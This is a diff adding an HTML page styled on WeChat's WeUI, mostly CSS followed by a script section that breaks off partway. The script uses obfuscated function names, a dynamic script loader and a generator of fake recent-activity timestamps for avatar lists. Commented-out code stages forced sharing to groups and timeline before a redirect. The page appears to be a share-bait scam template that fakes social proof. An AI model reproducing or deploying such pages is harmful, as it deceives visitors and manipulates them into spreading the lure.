@@ -1,0 +1,1575 @@
+<!DOCTYPE html>
+<html lang="en" style="font-size: 53.6px;">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title></title>
+	<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,viewport-fit=cover">
+	<script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/jquery/1.10.0/jquery.min.js"></script>
+	<style>
+		html, body {
+			background-color: #EDEDED
+		}
+
+		* {
+			padding: 0;
+			margin: 0
+		}
+
+		body {
+			font-family: -apple-system-font, BlinkMacSystemFont, "Helvetica Neue", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei UI", "Microsoft YaHei", Arial, sans-serif;
+		}
+
+		@font-face {
+			font-family: 'open';
+			src: url('img/open.woff2');
+			font-weight: normal;
+			font-style: normal;
+		}
+
+		@keyframes show1 {
+			0% {
+				opacity: 0;
+				transform: scale(0.2);
+			}
+			100% {
+				opacity: 1;
+				transform: scale(1);
+			}
+		}
+
+		@keyframes btn1 {
+			0% {
+				transform: rotate(-720deg);
+			}
+			100% {
+				transform: rotate(0deg);
+			}
+		}
+
+		@keyframes show2 {
+			0% {
+				opacity: 0;
+				transform: translateY(50%);
+			}
+			100% {
+				opacity: 1;
+				transform: translateY(0%);
+			}
+		}
+
+		@keyframes btn2 {
+			0% {
+				transform: scale(0)
+			}
+			100% {
+				transform: scale(1);
+			}
+		}
+
+		@keyframes show3 {
+			0% {
+				opacity: 0;
+				transform: translateY(-50%);
+			}
+			100% {
+				opacity: 1;
+				transform: translateY(0%);
+			}
+		}
+
+		@keyframes btn3 {
+			0% {
+				transform: scale(0)
+			}
+			100% {
+				transform: scale(1);
+			}
+		}
+
+		@keyframes show4 {
+			0% {
+				opacity: 0;
+				border-radius: 100%
+			}
+			100% {
+				opacity: 1;
+				border-radius: 0%;
+			}
+		}
+
+		@keyframes btn4 {
+			0% {
+				transform: scale(1, 0)
+			}
+			100% {
+				transform: scale(1, 1);
+			}
+		}
+
+		@keyframes btnShake1 {
+			0% {
+				transform: scale(1);
+			}
+			40% {
+				transform: scale(1.1);
+			}
+			60% {
+				transform: scale(.9);
+			}
+			80% {
+				transform: scale(1.2);
+			}
+			100% {
+				transform: scale(1);
+			}
+		}
+
+		@keyframes btnShake2 {
+			0% {
+				transform: scale(1);
+			}
+			40% {
+				transform: scale(1.1, 0.9);
+			}
+			60% {
+				transform: scale(.9, 1.1);
+			}
+			80% {
+				transform: scale(1.2, 0.8);
+			}
+			100% {
+				transform: scale(1);
+			}
+		}
+
+		@keyframes btnShake3 {
+			0% {
+				transform: scale(1, 1) rotate(0deg);
+			}
+			10% {
+				transform: scale(1.2, 0.8);
+			}
+			20% {
+				transform: scale(0.8, 1.2);
+			}
+			30% {
+				transform: scale(1.2, 0.8);
+			}
+			40% {
+				transform: scale(0.8, 1.2);
+			}
+			50% {
+				transform: scale(1, 1);
+			}
+			60% {
+				transform: rotate(-15deg);
+			}
+			70% {
+				transform: rotate(15deg);
+			}
+			80% {
+				transform: rotate(-25deg);
+			}
+			90% {
+				transform: rotate(25deg);
+			}
+			100% {
+				transform: scale(1, 1) rotate(0deg);
+			}
+		}
+
+		@keyframes btnShake4 {
+			0% {
+				transform: rotate(0deg);
+				opacity: 1;
+			}
+			10% {
+				transform: scale(1.2, 0.8);
+			}
+			20% {
+				transform: scale(0.8, 1.2);
+			}
+			30% {
+				transform: scale(1.2, 0.8);
+			}
+			40% {
+				transform: scale(0.8, 1.2);
+			}
+			50% {
+				transform: scale(1, 1);
+			}
+			60% {
+				opacity: 1;
+			}
+			70% {
+				opacity: 0.5;
+			}
+			80% {
+				opacity: 1;
+			}
+			90% {
+				opacity: 0.5;
+			}
+			100% {
+				transform: scale(1, 1);
+				opacity: 1;
+			}
+		}
+
+		@keyframes btnMove {
+			from {
+				transform: rotateY(180deg)
+			}
+			to {
+				transform: rotateY(360deg)
+			}
+		}
+
+		@keyframes itemMove1 {
+			0% {
+				height: 0rem;
+			}
+			100% {
+				height: 1.2rem;
+			}
+		}
+
+		@keyframes itemMove2 {
+			0% {
+				height: 0rem;
+				transform: scaleY(0);
+			}
+			40% {
+				height: 1.2rem;
+				transform: scaleY(0);
+			}
+			100% {
+				transform: scaleY(1);
+			}
+		}
+
+		@keyframes itemMove3 {
+			0% {
+				height: 0rem;
+				transform: translateX(2rem);
+				opacity: 0;
+			}
+			40% {
+				height: 1.2rem;
+				transform: translateX(2rem);
+				opacity: 0;
+			}
+			100% {
+				transform: translateX(0rem);
+				opacity: 1;
+			}
+		}
+
+		@keyframes itemMove4 {
+			0% {
+				height: 0rem;
+				transform: translateX(-2rem);
+				opacity: 0;
+			}
+			40% {
+				height: 1.2rem;
+				transform: translateX(-2rem);
+				opacity: 0;
+			}
+			100% {
+				transform: translateX(0rem);
+				opacity: 1;
+			}
+		}
+
+		@keyframes tipMove {
+			0% {
+				transform: translate(0rem, 0%);
+			}
+			40% {
+				transform: translate(-0.2rem, 30%);
+			}
+			100% {
+				transform: translate(0rem, 0%);
+			}
+		}
+
+		.text-tip {
+			position: relative;
+		}
+
+		.text-tip::before {
+			position: absolute;
+			content: "";
+			width: .0 .02rem;
+			height: .0 .02rem;
+			border: solid 8px rgba(0, 0, 0, 0);
+			border-right-color: #fae3b7;
+			top: 0rem;
+			left: -0.32rem
+		}
+
+		.icon-success {
+			color: #07c160;
+			display: inline-block;
+			vertical-align: middle;
+			mask-position: 50% 50%;
+			mask-repeat: no-repeat;
+			mask-size: 100%;
+			background-color: currentColor;
+			-webkit-mask-size: 100%;
+			width: 28px;
+			height: 28px;
+			-webkit-mask-image: url(data:image/svg+xml,%3Csvg%20width%3D%2224%22%20height%3D%2224%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M8.657%2018.435L3%2012.778l1.414-1.414%204.95%204.95L20.678%205l1.414%201.414-12.02%2012.021a1%201%200%2001-1.415%200z%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E)
+		}</style>
+	<style>
+		body {
+			--weui-BTN-DISABLED-FONT-COLOR: rgba(0, 0, 0, .2)
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) {
+				--weui-BTN-DISABLED-FONT-COLOR: hsla(0, 0%, 100%, .2)
+			}
+		}
+
+		body {
+			--weui-BTN-DEFAULT-BG: #f2f2f2
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) {
+				--weui-BTN-DEFAULT-BG: hsla(0, 0%, 100%, .08)
+			}
+		}
+
+		body {
+			--weui-BTN-DEFAULT-COLOR: #06ae56
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) {
+				--weui-BTN-DEFAULT-COLOR: hsla(0, 0%, 100%, .8)
+			}
+		}
+
+		body {
+			--weui-BTN-DEFAULT-ACTIVE-BG: #e6e6e6
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) {
+				--weui-BTN-DEFAULT-ACTIVE-BG: hsla(0, 0%, 48%, .1536)
+			}
+		}
+
+		body {
+			--weui-DIALOG-LINE-COLOR: rgba(0, 0, 0, .1)
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) {
+				--weui-DIALOG-LINE-COLOR: hsla(0, 0%, 100%, .1)
+			}
+		}
+
+		html {
+			-ms-text-size-adjust: 100%;
+			-webkit-text-size-adjust: 100%
+		}
+
+		body {
+			line-height: 1.6;
+			font-family: -apple-system-font, Helvetica Neue, sans-serif
+		}
+
+		* {
+			margin: 0;
+			padding: 0
+		}
+
+		a {
+			text-decoration: none;
+			-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
+		}
+
+		::-webkit-input-placeholder {
+			color: rgba(0, 0, 0, .3);
+			color: var(--weui-FG-2)
+		}
+
+		body {
+			--weui-BG-0: #ededed;
+			--weui-BG-1: #f7f7f7;
+			--weui-BG-2: #fff;
+			--weui-BG-3: #f7f7f7;
+			--weui-BG-4: #4c4c4c;
+			--weui-BG-5: #fff;
+			--weui-FG-0: rgba(0, 0, 0, .9);
+			--weui-FG-HALF: rgba(0, 0, 0, .9);
+			--weui-FG-1: rgba(0, 0, 0, .5);
+			--weui-FG-2: rgba(0, 0, 0, .3);
+			--weui-FG-3: rgba(0, 0, 0, .1);
+			--weui-RED: #fa5151;
+			--weui-ORANGE: #fa9d3b;
+			--weui-YELLOW: #ffc300;
+			--weui-GREEN: #91d300;
+			--weui-LIGHTGREEN: #95ec69;
+			--weui-BRAND: #07c160;
+			--weui-BLUE: #10aeff;
+			--weui-INDIGO: #1485ee;
+			--weui-PURPLE: #6467f0;
+			--weui-WHITE: #fff;
+			--weui-LINK: #576b95;
+			--weui-TEXTGREEN: #06ae56;
+			--weui-FG: #000;
+			--weui-BG: #fff;
+			--weui-TAG-TEXT-ORANGE: #fa9d3b;
+			--weui-TAG-BACKGROUND-ORANGE: rgba(250, 157, 59, .1);
+			--weui-TAG-TEXT-GREEN: #06ae56;
+			--weui-TAG-BACKGROUND-GREEN: rgba(6, 174, 86, .1);
+			--weui-TAG-TEXT-BLUE: #10aeff;
+			--weui-TAG-BACKGROUND-BLUE: rgba(16, 174, 255, .1);
+			--weui-TAG-TEXT-BLACK: rgba(0, 0, 0, .5);
+			--weui-TAG-BACKGROUND-BLACK: rgba(0, 0, 0, .05)
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) {
+				--weui-BG-0: #191919;
+				--weui-BG-1: #1f1f1f;
+				--weui-BG-2: #232323;
+				--weui-BG-3: #2f2f2f;
+				--weui-BG-4: #606060;
+				--weui-BG-5: #2c2c2c;
+				--weui-FG-0: hsla(0, 0%, 100%, .8);
+				--weui-FG-HALF: hsla(0, 0%, 100%, .6);
+				--weui-FG-1: hsla(0, 0%, 100%, .5);
+				--weui-FG-2: hsla(0, 0%, 100%, .3);
+				--weui-FG-3: hsla(0, 0%, 100%, .05);
+				--weui-RED: #fa5151;
+				--weui-ORANGE: #c87d2f;
+				--weui-YELLOW: #cc9c00;
+				--weui-GREEN: #74a800;
+				--weui-LIGHTGREEN: #28b561;
+				--weui-BRAND: #07c160;
+				--weui-BLUE: #10aeff;
+				--weui-INDIGO: #1196ff;
+				--weui-PURPLE: #8183ff;
+				--weui-WHITE: hsla(0, 0%, 100%, .8);
+				--weui-LINK: #7d90a9;
+				--weui-TEXTGREEN: #259c5c;
+				--weui-FG: #fff;
+				--weui-BG: #000;
+				--weui-TAG-TEXT-ORANGE: rgba(250, 157, 59, .6);
+				--weui-TAG-BACKGROUND-ORANGE: rgba(250, 157, 59, .1);
+				--weui-TAG-TEXT-GREEN: rgba(6, 174, 86, .6);
+				--weui-TAG-BACKGROUND-GREEN: rgba(6, 174, 86, .1);
+				--weui-TAG-TEXT-BLUE: rgba(16, 174, 255, .6);
+				--weui-TAG-BACKGROUND-BLUE: rgba(16, 174, 255, .1);
+				--weui-TAG-TEXT-BLACK: hsla(0, 0%, 100%, .5);
+				--weui-TAG-BACKGROUND-BLACK: hsla(0, 0%, 100%, .05)
+			}
+		}
+
+		body {
+			--weui-BG-COLOR-ACTIVE: #ececec
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) {
+				--weui-BG-COLOR-ACTIVE: #282828
+			}
+		}
+
+		[class^=weui-icon-] {
+			display: inline-block;
+			vertical-align: middle;
+			width: 24px;
+			height: 24px;
+			-webkit-mask-position: 50% 50%;
+			mask-position: 50% 50%;
+			-webkit-mask-repeat: no-repeat;
+			mask-repeat: no-repeat;
+			-webkit-mask-size: 100%;
+			mask-size: 100%;
+			background-color: currentColor
+		}
+
+		.weui-icon-success {
+			-webkit-mask-image: url(data:image/svg+xml,%3Csvg%20width%3D%2224%22%20height%3D%2224%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M12%2022C6.477%2022%202%2017.523%202%2012S6.477%202%2012%202s10%204.477%2010%2010-4.477%2010-10%2010zm-1.177-7.86l-2.765-2.767L7%2012.431l3.119%203.121a1%201%200%20001.414%200l5.952-5.95-1.062-1.062-5.6%205.6z%22%2F%3E%3C%2Fsvg%3E);
+			mask-image: url(data:image/svg+xml,%3Csvg%20width%3D%2224%22%20height%3D%2224%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M12%2022C6.477%2022%202%2017.523%202%2012S6.477%202%2012%202s10%204.477%2010%2010-4.477%2010-10%2010zm-1.177-7.86l-2.765-2.767L7%2012.431l3.119%203.121a1%201%200%20001.414%200l5.952-5.95-1.062-1.062-5.6%205.6z%22%2F%3E%3C%2Fsvg%3E)
+		}
+
+		.weui-icon-success {
+			color: #07c160;
+			color: var(--weui-BRAND)
+		}
+
+		.weui-icon_msg {
+			width: 64px;
+			height: 64px
+		}
+
+		.weui-btn {
+			position: relative;
+			display: block;
+			width: 184px;
+			margin-left: auto;
+			margin-right: auto;
+			padding: 8px 24px;
+			box-sizing: border-box;
+			font-weight: 700;
+			font-size: 17px;
+			text-align: center;
+			text-decoration: none;
+			color: #fff;
+			line-height: 1.41176471;
+			border-radius: 4px;
+			overflow: hidden;
+			-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
+		}
+
+		.weui-btn_primary {
+			background-color: #07c160;
+			background-color: var(--weui-BRAND)
+		}
+
+		.weui-btn_primary:not(.weui-btn_disabled):visited {
+			color: #fff
+		}
+
+		.weui-btn_primary:not(.weui-btn_disabled):active {
+			background-color: #06ae56;
+			background-color: var(--weui-TAG-TEXT-GREEN)
+		}
+
+		.weui-btn-area {
+			margin: 48px 16px 8px
+		}
+
+		.weui-cells {
+			margin-top: 8px;
+			background-color: #fff;
+			background-color: var(--weui-BG-2);
+			line-height: 1.41176471;
+			font-size: 17px;
+			overflow: hidden;
+			position: relative
+		}
+
+		.weui-cells:before {
+			top: 0;
+			border-top: 1px solid rgba(0, 0, 0, .1);
+			border-top: 1px solid var(--weui-FG-3);
+			-webkit-transform-origin: 0 0;
+			transform-origin: 0 0;
+			-webkit-transform: scaleY(.5);
+			transform: scaleY(.5)
+		}
+
+		.weui-cells:after, .weui-cells:before {
+			content: " ";
+			position: absolute;
+			left: 0;
+			right: 0;
+			height: 1px;
+			color: rgba(0, 0, 0, .1);
+			color: var(--weui-FG-3);
+			z-index: 2
+		}
+
+		.weui-cells:after {
+			bottom: 0;
+			border-bottom: 1px solid rgba(0, 0, 0, .1);
+			border-bottom: 1px solid var(--weui-FG-3);
+			-webkit-transform-origin: 0 100%;
+			transform-origin: 0 100%;
+			-webkit-transform: scaleY(.5);
+			transform: scaleY(.5)
+		}
+
+		.weui-cells__title {
+			margin-top: 16px;
+			margin-bottom: 3px;
+			padding-left: 16px;
+			padding-right: 16px;
+			color: rgba(0, 0, 0, .5);
+			color: var(--weui-FG-1);
+			font-size: 14px;
+			line-height: 1.4
+		}
+
+		.weui-cells__title + .weui-cells {
+			margin-top: 0
+		}
+
+		.weui-cell {
+			padding: 16px;
+			position: relative;
+			display: -webkit-box;
+			display: -webkit-flex;
+			display: flex;
+			-webkit-box-align: center;
+			-webkit-align-items: center;
+			align-items: center
+		}
+
+		.weui-cell:before {
+			content: " ";
+			position: absolute;
+			left: 0;
+			top: 0;
+			right: 0;
+			height: 1px;
+			border-top: 1px solid rgba(0, 0, 0, .1);
+			border-top: 1px solid var(--weui-FG-3);
+			color: rgba(0, 0, 0, .1);
+			color: var(--weui-FG-3);
+			-webkit-transform-origin: 0 0;
+			transform-origin: 0 0;
+			-webkit-transform: scaleY(.5);
+			transform: scaleY(.5);
+			left: 16px;
+			z-index: 2
+		}
+
+		.weui-cell:first-child:before {
+			display: none
+		}
+
+		.weui-cell__bd {
+			-webkit-box-flex: 1;
+			-webkit-flex: 1;
+			flex: 1
+		}
+
+		.weui-cell__ft {
+			text-align: right;
+			color: rgba(0, 0, 0, .5);
+			color: var(--weui-FG-1)
+		}
+
+		.weui-cell_access {
+			-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+			color: inherit
+		}
+
+		.weui-cell_access:active {
+			background-color: #ececec;
+			background-color: var(--weui-BG-COLOR-ACTIVE)
+		}
+
+		.weui-cell_access .weui-cell__ft {
+			padding-right: 22px;
+			position: relative
+		}
+
+		.weui-cell_access .weui-cell__ft:after {
+			content: " ";
+			width: 12px;
+			height: 24px;
+			-webkit-mask-position: 0 0;
+			mask-position: 0 0;
+			-webkit-mask-repeat: no-repeat;
+			mask-repeat: no-repeat;
+			-webkit-mask-size: 100%;
+			mask-size: 100%;
+			background-color: currentColor;
+			color: rgba(0, 0, 0, .3);
+			color: var(--weui-FG-2);
+			-webkit-mask-image: url(data:image/svg+xml,%3Csvg%20width%3D%2212%22%20height%3D%2224%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M2.454%206.58l1.06-1.06%205.78%205.779a.996.996%200%20010%201.413l-5.78%205.779-1.06-1.061%205.425-5.425-5.425-5.424z%22%20fill%3D%22%23B2B2B2%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E);
+			mask-image: url(data:image/svg+xml,%3Csvg%20width%3D%2212%22%20height%3D%2224%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M2.454%206.58l1.06-1.06%205.78%205.779a.996.996%200%20010%201.413l-5.78%205.779-1.06-1.061%205.425-5.425-5.425-5.424z%22%20fill%3D%22%23B2B2B2%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E);
+			position: absolute;
+			top: 50%;
+			right: 0;
+			margin-top: -12px
+		}
+
+		.weui-msg {
+			padding-top: 48px;
+			padding: calc(48px + constant(safe-area-inset-top)) constant(safe-area-inset-right) constant(safe-area-inset-bottom) constant(safe-area-inset-left);
+			padding: calc(48px + env(safe-area-inset-top)) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+			text-align: center;
+			line-height: 1.4;
+			min-height: 100%;
+			box-sizing: border-box;
+			display: -webkit-box;
+			display: -webkit-flex;
+			display: flex;
+			-webkit-box-orient: vertical;
+			-webkit-box-direction: normal;
+			-webkit-flex-direction: column;
+			flex-direction: column;
+			background-color: #fff;
+			background-color: var(--weui-BG-2)
+		}
+
+		.weui-msg__icon-area {
+			margin-bottom: 32px
+		}
+
+		.weui-msg__text-area {
+			margin-bottom: 32px;
+			padding: 0 32px;
+			-webkit-box-flex: 1;
+			-webkit-flex: 1;
+			flex: 1;
+			line-height: 1.6
+		}
+
+		.weui-msg__title {
+			font-weight: 700;
+			font-size: 22px
+		}
+
+		.weui-msg__desc, .weui-msg__title {
+			margin-bottom: 16px;
+			word-wrap: break-word;
+			word-break: break-all
+		}
+
+		.weui-msg__desc {
+			font-size: 17px;
+			color: rgba(0, 0, 0, .9);
+			color: var(--weui-FG-0)
+		}
+
+		.weui-msg__opr-area {
+			margin-bottom: 16px
+		}
+
+		.weui-msg__opr-area .weui-btn-area {
+			margin: 0
+		}
+
+		.weui-msg__opr-area:last-child {
+			margin-bottom: 96px
+		}
+
+		.weui-footer {
+			text-align: center;
+			font-size: 14px
+		}
+
+		.weui-footer {
+			color: rgba(0, 0, 0, .3);
+			color: var(--weui-FG-2);
+			line-height: 1.4
+		}
+
+		.weui-footer a {
+			color: #576b95;
+			color: var(--weui-LINK)
+		}
+
+		.weui-footer_fixed-bottom {
+			position: fixed;
+			bottom: 0;
+			left: 0;
+			right: 0;
+			padding-top: 16px;
+			padding-bottom: 16px;
+			padding-bottom: calc(16px + constant(safe-area-inset-bottom));
+			padding-bottom: calc(16px + env(safe-area-inset-bottom));
+			left: constant(safe-area-inset-left);
+			left: env(safe-area-inset-left);
+			right: constant(safe-area-inset-right);
+			right: env(safe-area-inset-right)
+		}
+
+		.weui-footer__links {
+			font-size: 0
+		}
+
+		.weui-footer__link {
+			display: inline-block;
+			vertical-align: top;
+			margin: 0 8px;
+			position: relative;
+			font-size: 14px
+		}
+
+		.weui-footer__link:before {
+			content: " ";
+			position: absolute;
+			left: 0;
+			top: 0;
+			width: 1px;
+			bottom: 0;
+			border-left: 1px solid rgba(0, 0, 0, .1);
+			border-left: 1px solid var(--weui-FG-3);
+			color: rgba(0, 0, 0, .1);
+			color: var(--weui-FG-3);
+			-webkit-transform-origin: 0 0;
+			transform-origin: 0 0;
+			-webkit-transform: scaleX(.5);
+			transform: scaleX(.5);
+			left: -8px;
+			top: .36em;
+			bottom: .36em
+		}
+
+		.weui-footer__link:first-child:before {
+			display: none
+		}
+
+		.weui-toast {
+			position: fixed;
+			z-index: 5000;
+			width: 120px;
+			height: 120px;
+			top: 40%;
+			left: 50%;
+			-webkit-transform: translate(-50%, -50%);
+			transform: translate(-50%, -50%);
+			text-align: center;
+			border-radius: 5px;
+			color: hsla(0, 0%, 100%, .9);
+			display: -webkit-box;
+			display: -webkit-flex;
+			display: flex;
+			-webkit-box-orient: vertical;
+			-webkit-box-direction: normal;
+			-webkit-flex-direction: column;
+			flex-direction: column;
+			-webkit-box-align: center;
+			-webkit-align-items: center;
+			align-items: center;
+			-webkit-box-pack: center;
+			-webkit-justify-content: center;
+			justify-content: center;
+			background-color: #4c4c4c
+		}
+
+		@media (prefers-color-scheme: dark) {
+			body:not([data-weui-theme=light]) .weui-toast {
+				background-color: #606060
+			}
+		}
+
+		.weui-icon_toast {
+			display: block
+		}
+
+		.weui-icon_toast.weui-loading {
+			margin: 8px 0;
+			width: 38px;
+			height: 38px;
+			vertical-align: baseline
+		}
+
+		.weui-toast__content {
+			font-size: 14px
+		}
+
+		.weui-mask_transparent {
+			position: fixed;
+			z-index: 1000;
+			top: 0;
+			right: 0;
+			left: 0;
+			bottom: 0
+		}
+
+		.weui-search-bar__input:not(:valid) ~ .weui-icon-clear {
+			display: none
+		}
+
+		.weui-loading {
+			width: 20px;
+			height: 20px;
+			display: inline-block;
+			vertical-align: middle;
+			-webkit-animation: f 1s steps(12) infinite;
+			animation: f 1s steps(12) infinite;
+			background: transparent url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120' viewBox='0 0 100 100'%3E%3Cpath fill='none' d='M0 0h100v100H0z'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23E9E9E9' rx='5' ry='5' transform='translate(0 -30)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23989697' rx='5' ry='5' transform='rotate(30 105.98 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%239B999A' rx='5' ry='5' transform='rotate(60 75.98 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23A3A1A2' rx='5' ry='5' transform='rotate(90 65 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23ABA9AA' rx='5' ry='5' transform='rotate(120 58.66 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23B2B2B2' rx='5' ry='5' transform='rotate(150 54.02 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23BAB8B9' rx='5' ry='5' transform='rotate(180 50 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23C2C0C1' rx='5' ry='5' transform='rotate(-150 45.98 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23CBCBCB' rx='5' ry='5' transform='rotate(-120 41.34 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23D2D2D2' rx='5' ry='5' transform='rotate(-90 35 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23DADADA' rx='5' ry='5' transform='rotate(-60 24.02 65)'/%3E%3Crect width='7' height='20' x='46.5' y='40' fill='%23E2E2E2' rx='5' ry='5' transform='rotate(-30 -5.98 65)'/%3E%3C/svg%3E") no-repeat;
+			background-size: 100%
+		}
+
+		@-webkit-keyframes f {
+			0% {
+				-webkit-transform: rotate(0deg);
+				transform: rotate(0deg)
+			}
+			to {
+				-webkit-transform: rotate(1turn);
+				transform: rotate(1turn)
+			}
+		}
+
+		@keyframes f {
+			0% {
+				-webkit-transform: rotate(0deg);
+				transform: rotate(0deg)
+			}
+			to {
+				-webkit-transform: rotate(1turn);
+				transform: rotate(1turn)
+			}
+		}
+
+		body {
+			background-color: var(--weui-BG-0);
+			color: var(--weui-FG-0)
+		}
+
+		.weui-cell:before, .weui-cells:after, .weui-cells:before {
+			z-index: 0
+		}
+
+		.weui-textarea::-webkit-input-placeholder {
+			color: var(--weui-FG-2)
+		}
+
+		.weui-textarea::-ms-input-placeholder {
+			color: var(--weui-FG-2)
+		}
+
+		.weui-textarea::placeholder {
+			color: var(--weui-FG-2)
+		}
+
+		.weui-msg__extra-area {
+			position: relative;
+			padding: 20px 20px;
+			text-align: center;
+			margin-bottom: calc(24px + constant(safe-area-inset-bottom));
+			margin-bottom: calc(24px + env(safe-area-inset-bottom))
+		}
+
+		.button-area[data-v-0f7a6f22] {
+			position: absolute;
+			bottom: 0;
+			left: 0;
+			right: 0;
+			padding: 20px 20px calc(96px + constant(safe-area-inset-bottom));
+			padding: 20px 20px calc(96px + env(safe-area-inset-bottom))
+		}
+
+		.weui-select[data-v-0f7a6f22] {
+			-webkit-tap-highlight-color: transparent
+		}
+
+		.weui-msg {
+			background-color: var(--BG-2)
+		}
+
+		.weui-msg__desc, .weui-msg__title {
+			color: var(--FG-0)
+		}
+
+		.weui-cells__links {
+			color: #586c94
+		}
+	</style>
+</head>
+<body>
+<div onclick="report()" id="tousuAn"  style="position: fixed;right: 0;bottom: 22%;width: .6rem;height: 2rem;z-index: 1;">
+	<span style="display: inline-block;width: 100%;height: 100%;background: url(img/ts.png) no-repeat;background-size: 100%;"></span>
+</div>
+<script>
+    !function (a, b) {
+        var c = b.documentElement
+            , d = "orientationchange" in window ? "orientationchange" : "resize"
+            , e = function () {
+            var a = c.clientWidth;
+            a && (c.style.fontSize = 100 * (a / 750) + "px");
+        };
+        b.addEventListener && (e(),
+            a.addEventListener(d, e, !1),
+            b.addEventListener("DOMContentLoaded", e, !1));
+    }(window, document);
+
+    function Element(a) {
+        var b = a.tagName
+            , c = a.props
+            , d = a.children;
+        return this instanceof Element ? (this.tagName = b,
+            this.props = c || {},
+            this.children = d || [],
+            void 0) : new Element({
+            tagName: b,
+            props: c,
+            children: d
+        });
+    }
+
+    Element.prototype.render = function () {
+        var a, b, c = document.createElement(this.tagName), d = this.props;
+        for (a in d)
+            b = d[a],
+                c.setAttribute(a, b);
+        return this.children.forEach(function (a) {
+            var b = null;
+            b = a instanceof Element ? a.render() : document.createTextNode(a),
+                c.appendChild(b);
+        }),
+            c;
+    }
+
+    function fdm7r1dmx9khg(a) {
+        return document.querySelector(a);
+    }
+
+    function is74wle4kbr2y(a, b) {
+        var c = document.createElement("script");
+        c.src = a,
+            c.onload = function () {
+                "function" == typeof b && b();
+            },
+            document.body.appendChild(c);
+    }
+
+    function report() {
+        $('#index').css('display', 'none')
+        $('#tousuAn').css('display', 'none')
+        $('#mytousu').css('display', 'block')
+    }
+
+    function qolmr51n0qvnnjnk() {
+        switch (step) {
+            case 0:
+                // app.alert(api.alert, "我知道了");
+                break;
+
+            // case 1:
+            //     app.alert(api.alert1),
+            //         api.qunShareNum >= 4 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 4 && wx.onMenuShareAppMessage(info.message);
+            //     break;
+            //
+            // case 2:
+            //     app.alert(api.alert2),
+            //         api.qunShareNum >= 3 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 3 && wx.onMenuShareAppMessage(info.message);
+            //     break;
+            //
+            // case 3:
+            //     app.alert(api.alert3),
+            //         api.qunShareNum >= 2 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 2 && wx.onMenuShareAppMessage(info.message);
+            //     break;
+            //
+            // case 4:
+            //     app.alert(api.alert4),
+            //         api.qunShareNum >= 1 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 1 && wx.onMenuShareAppMessage(info.message);
+            //     break;
+            //
+            // case 5:
+            //     wx.hideOptionMenu(),
+            //         wx.showMenuItems({
+            //             menuList: ["menuItem:share:timeline"]
+            //         }),
+            //         app.alert(api.alert5);
+            //     break;
+            //
+            // case 6:
+            //     app.alert(api.alert6),
+            //         api.quanShareNum >= 1 ? wx.onMenuShareTimeline(info.ad.timeline) : wx.onMenuShareTimeline(info.timeline);
+            //     break;
+            //
+            // case 7:
+            //     app.alert(api.alert7, "好的", function () {
+            //         //location.href = api.complatelink;
+            //         is74wle4kbr2y(backlink)
+            //     });
+        }
+    }
+
+    function l3mustwasrzo8us7() {
+        qolmr51n0qvnnjnk();
+    }
+
+    function i28o2hkspuvyo8wb() {
+        function a(a, b) {
+            var c = b - a + 1;
+            return Math.floor(Math.random() * c + a);
+        }
+
+        function b() {
+            var a = Math.floor(10 * Math.random()) + 5
+                , b = new Date(new Date().getTime() - 6e4 * a)
+                , c = ("0" + b.getHours()).slice(-2)
+                , d = ("0" + b.getMinutes()).slice(-2);
+            return ("0" + b.getSeconds()).slice(-2),
+            c + ":" + d;
+        }
+
+        function c(a) {
+            return Element({
+                tagName: "li",
+                props: {
+                    style: "width: 100%;height: 1.2rem;overflow: hidden;box-sizing: border-box;padding: 0rem 0.2rem;border-bottom: 0.02rem solid rgba(0, 0, 0, 0.05);display: flex;flex-wrap: wrap;align-items: center;justify-content: center;"
+                },
+                children: [Element({
+                    tagName: "img",
+                    props: {
+                        src: a.avatar,
